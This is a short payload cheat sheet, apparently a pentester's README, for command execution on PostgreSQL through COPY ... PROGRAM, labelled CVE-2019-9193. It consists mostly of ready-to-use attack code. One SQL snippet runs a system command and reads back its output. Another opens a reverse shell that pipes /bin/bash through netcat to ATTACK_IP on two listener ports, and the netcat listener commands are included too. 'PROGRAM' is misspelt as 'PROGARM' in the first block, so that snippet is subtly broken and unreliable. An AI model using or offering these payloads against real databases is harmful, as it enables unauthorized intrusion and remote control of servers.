# payloads
Finally got tired of writing the same payloads over and over again.

## Postgres 9.3 > Latest Command Execution: CVE-2019-9193
**Data Exfil via COPY FROM PROGARM and SELECT**
```
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGARM 'whoami';
SELECT * FROM cmd_exec;
```

**Reverse Shell via COPY TO PROGRAM**
On attack machine tab1 (shell input):
```
nc -lvp 4444
```

On attack machine tab2 (shell output):
```
nc -lvp 4445
```

On the target run the payload listed below. The shell will close when the SQL
query is complete, so you need to set the number of seconds you want the shell
open for via `pg_sleep`. Also be sure to set the ATTACK_IP.
```
COPY (SELECT pg_sleep(120)) TO PROGRAM 'nc ATTACK_IP 4444 | /bin/bash -i 2>&1 | nc ATTACK_IP 4445;'
```
